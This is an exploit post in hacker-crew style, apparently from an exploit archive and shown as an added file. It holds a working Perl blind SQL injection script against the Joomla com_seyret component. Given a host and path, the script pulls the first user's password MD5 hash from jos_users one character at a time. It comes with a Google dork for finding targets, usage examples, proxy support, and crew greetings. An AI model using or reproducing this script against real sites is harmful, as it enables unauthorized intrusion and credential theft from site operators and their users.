@@ -1,0 +1,147 @@
+1                ###########################################           1
+0                I'm **RoAd_KiLlEr**  member from Inj3ct0r Team         1
+1                ###########################################           0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+[+]Title              :Joomla Component (com_seyret) Blind SQL Injection Exploit
+[+]Author          :**RoAd_KiLlEr**
+[+]Contact        :RoAd_KiLlEr[at]Khg-Crew[dot]Ws
+[+]Tested on     :Win Xp Sp 2/3
+---------------------------------------------------------------------------
+[~] Founded by **RoAd_KiLlEr**
+[~] Team: Albanian Hacking Crew
+[~] Contact: RoAd_KiLlEr[at]Khg-Crew[dot]Ws 
+[~] Home: http://a-h-crew.net    
+[~] Vendor:http://joomlaholic.com/
+[~] Download App:http://joomlaholic.com/downloads/2-seyret-video-component
+==========ExPl0iT3d by **RoAd_KiLlEr**==========
+
+[+]EXPLOIT:
+
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[1])
+{
+system("Title Albanian Hacking Crew"); 
+ print " \n";
+ print " #######################################################################\n";
+ print "  #   Joomla Component (com_seyret) Blind SQL Injection Exploit \n";
+ print "  # -----------------------------------------------------------\n";
+ print "  #   Author: **RoAd_KiLlEr** \n";
+ print "  #   Greetz: Ton![W]indowS,X-n3t,b4cKd00r ~,DarkHacker.,The|DennY`\n";
+ print "  #   Site:   www.a-h-crew.net\n";
+ print "  # -----------------------------------------------------------\n";
+ print "  #   Dork :   inurl:com_seyret              \n";
+ print "  #   Usage:   perl exploit.pl host path <options> \n";
+ print "  #   Example: perl exploit.pl www.host.com /path/ -a 3 \n";
+ print "  # -----------------------------------------------------------\n";
+ print "  #   Options: \n";
+ print "  #     -a   valid  id \n";
+ print " #######################################################################\n";
+ exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $userid  = 1;
+my $aid     = $ARGV[2];
+
+my %options = ();
+GetOptions(\%options, "u=i", "p=s", "a=i");
+
+print "[~] Exploiting...\n";
+
+if($options{"u"})
+{
+ $userid = $options{"u"};
+}
+
+if($options{"a"})
+{
+ $aid = $options{"a"};
+}
+
+syswrite(STDOUT, "[~] MD5-Hash: ", 14);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+ my $f = 0;
+ my $h = 48;
+ while(!$f && $h <= 57)
+ {
+   if(istrue2($host, $path, $userid, $aid, $i, $h))
+   {
+     $f = 1;
+     syswrite(STDOUT, chr($h), 1);
+   }
+   $h++;
+ }
+ if(!$f)
+ {
+   $h = 97;
+   while(!$f && $h <= 122)
+   {
+     if(istrue2($host, $path, $userid, $aid, $i, $h))
+     {
+       $f = 1;
+       syswrite(STDOUT, chr($h), 1);
+     }
+     $h++;
+   }
+ }
+}
+
+print "\n[~] Exploiting done\n";
+
+sub istrue2
+{
+ my $host  = shift;
+ my $path  = shift;
+ my $uid   = shift;
+ my $aid   = shift;
+ my $i     = shift;
+ my $h     = shift;
+
+ my $ua = LWP::UserAgent->new;
+ my $query = "http://".$host.$path."index.php? option=com_seyret&task=videodirectlink&id=".$aid." and ascii(SUBSTRING((SELECT password FROM  jos_users LIMIT 0,1),".$i.",1))=".$h."";
+
+ if($options{"p"})
+ {
+   $ua->proxy('http', "http://".$options{"p"});
+ }
+
+ my $resp = $ua->get($query);
+ my $content = $resp->content;
+ my $regexp = "Back";
+
+ if($content =~ /$regexp/)
+ {
+   return 1;
+ }
+ else
+ {
+   return 0;
+ }
+
+}
+
+
+
+===========================================================================================
+[!] Albanian Hacking Crew           
+===========================================================================================
+[!] **RoAd_KiLlEr**   
+===========================================================================================
+[!] MaiL: sukihack[at]gmail[dot]com
+===========================================================================================
+[!] Greetz To : Ton![w]indowS | X-n3t | b4cKd00r ~ | DarKHackeR. | The|DennY` | EaglE EyE | Lekosta | KHG | THE_1NV1S1BL3 & All Albanian/Kosova Hackers 
+===========================================================================================
+[!] Spec Th4nks: Inj3ct0r.com & r0073r  | indoushka from Dz-Ghost Team  | MaFFiTeRRoR | Sid3^effects | The_Exploited | And All My Friendz
+===========================================================================================
+[!] Red n'black i dress eagle on my chest
+It's good to be an ALBANIAN
+Keep my head up high for that flag I die
+Im proud to be an ALBANIAN
+===========================================================================================
